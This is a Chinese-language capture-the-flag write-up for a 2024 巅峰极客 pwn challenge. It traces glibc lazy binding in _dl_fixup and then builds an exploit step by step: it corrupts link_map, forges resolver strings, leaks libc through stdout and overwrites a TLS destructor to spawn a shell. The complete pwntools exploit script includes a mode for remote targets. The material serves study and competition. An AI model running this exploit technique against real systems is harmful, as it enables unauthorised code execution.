# 2024-08-18-巅峰极客-pwn

‍

## 简单分析

‍

![image](assets/image-20240818103728-wpqxyvt.png)

![image](assets/image-20240818103837-o5jlngt.png)

‍

![image](assets/image-20240818103951-qpg7zch.png)

‍

‍

- 小结

  - malloc 一个比较大的 chunk, 一般会分配到libc基地址的上面
  - 因为有固定偏移所以我们可以在这个范围内修改一个可写的内存地址值
  - 保护不全，在任意写之后，后面还会调用 write 和 Exit 等libc 里的函数，第一次执行的时候 got 表里面不是真正的函数地址而是一个负责解析函数的。（延迟绑定）

![image](assets/image-20240819185757-khho83u.png)

- 关于延迟绑定

![image](assets/image-20240819190836-avmfy4i.png)

‍

‍

‍

## 调试分析解析地址的过程

‍

- 网上的文章太高大上了，我不能很好的理解，然后很多点是我慢慢调出来的

‍

‍

- 简单的调试一下正常解析函数地址的整个过程.（写的不是很好,请原谅)

- 这里的调试分析为后面攻击做铺垫

1. 进入，（注意 push 0 大概是 函数在got 表的索引，后面的计算得到的函数字符串都与它有关，具体调试可知）

![image](assets/image-20240819191439-k7rxn5z.png)

‍

2. 压在stack 上一个地址

![image](assets/image-20240819191907-h21x8la.png)

‍

3. 继续跟进 `_dl_fixup`

![image](assets/image-20240819192436-8awmakt.png)

4. 这里从rdi +0x68 取一个地址，然后把在+8 的地址也有一个地址 `0x608bcb8804b8`

![image](assets/image-20240819193702-vu0x4n7.png)

‍

5. 从`[r10]` 取出elf_base 然后和got 地址的offset 相加计算得到 write_got 地址

![image](assets/image-20240819195208-vhrhetv.png)

![image](assets/image-20240819193122-f6ltlre.png)

‍

6. 这里的rdi 是 在第4步那里得到的，然后 `add rdi,rdx` 会得到 write 字符串的地址

![image](assets/image-20240819193306-a11z6gk.png)

‍

7. ​`_dl_lookup_symbox_x` 返回了libc 基地址，具体还干了什么我也不知道 （盲才应该是通过字符串来确定要调用的函数，ret 后 应该也会返回 对应函数的偏移地址）

![image](assets/image-20240819194153-ykv9puc.png)

![image](assets/image-20240819194400-gjghwcd.png)

8. 这里 从 r8 里取出 libc 的基地址， `[rdx+8]` 应该就是 write 地址的偏移了，后面的add 计算得到 write 的真正地址

![image](assets/image-20240819194602-j6y2wc9.png)

‍

9. 把 write 的地址，写道 got 表里面. (got 表是 第5步算出来的)

‍

![image](assets/image-20240819194922-19z5rrc.png)

‍

10. 调用函数了

![image](assets/image-20240819195630-i9l5sxv.png)

‍

‍

- 个人总结上面做的几件事情

  1. 通过 `link_map` 里的 elf_base 加上 write@got_offset 计算 write@got的地址
  2. 然后再计算 write 字符串表的地址，然后 `_dl_lookup_symbox_x` 拿到 函数offset，
  3. 后面再取libc_base + 函数偏移到到函数地址，再把地址存放到 上面计算的 got 地址
  4. 总体下来， 我们可以修改的点有`link_map` 里的 elf_base，使计算的got地址发生变化，等等

![image](assets/image-20240819220809-enwoic6.png)

‍

‍

## 利用过程

‍

- 简单跟着exp.py 的思路走一下

- 只能修改一次使远远不够的，我们需要让程序环起来无次数限制的修改
- 只要 `_Exit()` 不退出，就可以达成一下效果

![image](assets/image-20240819221726-chqiz0c.png)

‍

‍

‍

### 跟着exploit 讲解

‍

- 根据上面的信息我们可以得知如果 `_Exit()` 不让程序退出，我们将无限循环。
- 所以说第一次修改哪里？是非常重要的一步。

‍

### 让程序环起来，信不信让你飞起来！

```python
def edit(offset, data):
    pay = p64(offset)
    pay += p8(data)
    s(pay)
    io.recvuntil('HELLO WORLD\x00',timeout=1)
    #pause()

def edits(offset,data):
    for i, byte in enumerate(data):
        pay  = p64(offset + i)
        pay += p8(byte)
        s(pay)
        io.recvuntil('HELLO WORLD\x00',timeout=1)

libc_offset = 266224
ld_offset   = libc_offset + 0x1FA000
linkmap_offset = libc_offset + 2265488

l_addr_offset = elf.got["_Exit"] - elf.got["write"]


edit(linkmap_offset, l_addr_offset) # 0x18
```

- 此次选择的方法是, 修改 `link_map` 上的 elf_base 地址，因为计算got表地址需要利用到这个基地址加 offset,切这个elf_base 存储的段是 rw,

![image](assets/image-20240819223002-ajouoyi.png)

write@got 和 _Exit@got 相差 0x18 ，看图 （ 注意正在解析write 的地址）

![image](assets/image-20240819223131-ycyyb13.png)

- 然后跟着走

![image](assets/image-20240819223602-kr8obax.png)

- 也是成功的把解析后的write地址放到exit@got,
- 后面不用多说了，已经可以一直执行任意偏移写的操作了

![image](assets/image-20240819223716-jnr3nir.png)

‍

### 循环起来后我们该干什么？

- 接下来就是泄露地址
- 任意函数调用
- 通过stdout 泄露地址，然后后面就是各种攻击方法了 自由发挥
- 但是我打 apple 不太行，后面后改成 打tls exit 触发 `system('/bin/sh')`

### 先理解一下任意地址call

‍

```python
edits(ld_offset + ld.symbols["_r_debug"] + 0x3e, b'_IO_flush_all\x00') # 0x3e 也不是各个版本固定的，需要根据情况去修改

# b *_dl_fixup+204

edit(linkmap_offset + 0x40+5*0x8, 0xb8) # start flush # 0xb8 也是
```

‍

‍

- 没修改

![image](assets/image-20240819233853-9l0pajm.png)

- 修改后

![image](assets/image-20240819233913-loqapds.png)

- 为什么把低位修改成 0xb8 呢？我们简单看一下， 这里是 _r_debug

![image](assets/image-20240819234025-zr2vvsl.png)

- 继续跟着调试

![image](assets/image-20240819234132-ncttgtg.png)

- 这里解析到的正好就是 `_IO_flush_all`​ 的函数名了，不用多说了把，后面可能就会执行`_IO_flush_all` 函数了

![image](assets/image-20240819234408-bducekk.png)

- 后面也就可以任意函数调用了

![image](assets/image-20240819234425-lj9wx16.png)

‍

‍

### stdout 泄露地址

‍

- 他这里是修改后，执行 `_IO_flush_all` 就可以泄露地址

![image](assets/image-20240819233432-hsdn8wm.png)

‍

```python
edits(_IO_2_1_stdout_, p32(0xfbad1800))
edits(_IO_2_1_stdout_ + 0x28, b'\xff')
edits(ld_offset + ld.symbols["_r_debug"] + 0x3e, b'_IO_flush_all\x00')
edit(linkmap_offset + 0x40+5*0x8, 0xb8)
```

- 但是此题目 IO 都是空的，执行过一次 `_IO_flush_all`后才有地址,需要第二次修改后再执行 才能泄露

![image](assets/image-20240819235204-v20gwpy.png)

- 执行完 `_IO_flush_all` 后出现地址，但是呢它这个是堆地址，啥也泄露不了,

![image](assets/image-20240819235237-3isiz60.png)

‍

- 后面发现改下flags 的值后，再次 执行 `_IO_flush_all` 就成 libc 上的地址了，具体什么原理我也不太清楚

```python
# edits(_IO_2_1_stdout_, p32(0xfbad1800))
edits(_IO_2_1_stdout_, p32(0xfbad3887))
edits(_IO_2_1_stdout_ + 0x28, b'\xff')
edits(ld_offset + ld.symbols["_r_debug"] + 0x3e, b'_IO_flush_all\x00')
edit(linkmap_offset + 0x40+5*0x8, 0xb8)
```

![image](assets/image-20240819235758-xuujjt9.png)

‍

‍

- 泄露地址

![image](assets/image-20240820000226-k3575qz.png)

‍

### over

‍

上面是我遇到的一些难点，之后就是自由发挥了

- 感觉写的比较乱

‍

## 记录一下调试点

- gdbscript

‍

```python
telescope  _rtld_global._dl_ns._ns_loaded
# 指针指向



b *_dl_fixup+204
# 函数字符串

p _IO_2_1_stdout_

dl_fixup+256
```

‍

## 最终exploit

‍

```python
from pwn import *
import sys

# Define lambda functions for common operations
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
ls      = lambda data               :log.success(data)
lss     = lambda s                  :ls('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
itr     = lambda                    :io.interactive()
# Context settings
context.arch      = 'amd64'
context.log_level = 'debug' # info
context.terminal  = ['tmux','splitw','-h','-l','170']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if   args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.CMD: return process(binary.split(' '))
    #elif args.REM: return remote('8.147.128.187', 43835)
    elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))
    '''     Usage: python3 exp.py AWD <IP> <PORT>   '''
    return process([binary] + argv, *a, **kw)

binary = './pwn'
libelf = './libc.so.6'
ldfelf = './ld-linux-x86-64.so.2'
try:
    elf  = ELF(binary)
    libc = ELF(libelf)
    ld = ELF(ldfelf)
    ''' Load binary and libraries '''
except: exit(0)

gdbscript = '''
#brva 0x0011CB
#b *__call_tls_dtors+61
continue
'''.format(**locals())
io = start(binary)


#gdb.attach(io,gdbscript)

def edit(offset, data):
    pay = p64(offset)
    pay += p8(data)
    s(pay)
    io.recvuntil('HELLO WORLD\x00',timeout=1)
    #pause()

def edits(offset,data):
    for i, byte in enumerate(data):
        pay  = p64(offset + i)
        pay += p8(byte)
        s(pay)
        io.recvuntil('HELLO WORLD\x00',timeout=1)

libc_offset = 266224
ld_offset   = libc_offset + 0x1FA000
linkmap_offset = libc_offset + 2265488

l_addr_offset = elf.got["_Exit"] - elf.got["write"]


edit(linkmap_offset, l_addr_offset)



_IO_2_1_stdout_ = libc_offset + libc.sym['_IO_2_1_stdout_']
_IO_2_1_stderr_ = libc_offset + libc.sym['_IO_2_1_stderr_']
lss("_IO_2_1_stdout_")
#edits(_IO_2_1_stdout_, p32(0xfbad1800))
edits(_IO_2_1_stdout_, p32(0xfbad3887))
edits(_IO_2_1_stdout_ + 0x28, b'\xff') 

#edits(ld_offset + ld.symbols["_r_debug"] + 0x3e, b'system\x00')
edits(ld_offset + ld.symbols["_r_debug"] + 0x3e, b'_IO_flush_all\x00')

#gdb.attach(io,'b *_dl_fixup+204')
#edit(linkmap_offset + 0x40+5*0x8, 0x8b)
#pause()

edit(linkmap_offset + 0x40+5*0x8, 0xb8) # start flush


edit(linkmap_offset + 0x40+5*0x8, 0x78) # stop flush


edits(_IO_2_1_stdout_, p32(0xfbad1800))
edits(_IO_2_1_stdout_ + 0x28, b'\xff') 

#pause()
edit(linkmap_offset + 0x40+5*0x8, 0xb8) # start flush


data = r(5)
libc_base = uu64(r(6)) - 2025440
lss('libc_base')

edit(linkmap_offset + 0x40+5*0x8, 0x78) # stop flush



libc.address = libc_base

def rol(num,i):
    part1 = num << i
    part1 &= (1 << 64) - 1
    part2 = num >> (64- i)
    return part1 + part2

system = rol(libc.sym['system'],0x11)
lss('system')
bin_sh = next(libc.search(b'/bin/sh'))

tls_offset = 2045248 # libc - xx
tls_0x58s  = tls_offset - 0x58 + libc_offset
tls_0x58a  = tls_offset - 0x58 + libc_base

pay = flat({
    0x00:tls_0x58a+0x8,
    0x08:system,
    0x10:bin_sh, # args rdi
    0x68:tls_0x58a, #
    0x90:0x00 # 补到
    },filler=b'\x00')

edits(tls_0x58s, pay)

#
edits(ld_offset + ld.symbols["_r_debug"] + 0x3e, b'exit\x00')
#pause()
edit(linkmap_offset + 0x40+5*0x8, 0xb8) # start flush


print(gdbscript)
itr()
```

‍

![image](assets/image-20240820000241-jw9by2h.png)

‍

## 参考文章

‍

```python
https://csc8.github.io/2023/04/06/qwarmup/#exp

# 基本上就是原题，讲的非常详细
https://hackmd.io/@pepsipu/ry-SK44pt


https://ywhkkx.github.io/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/
```
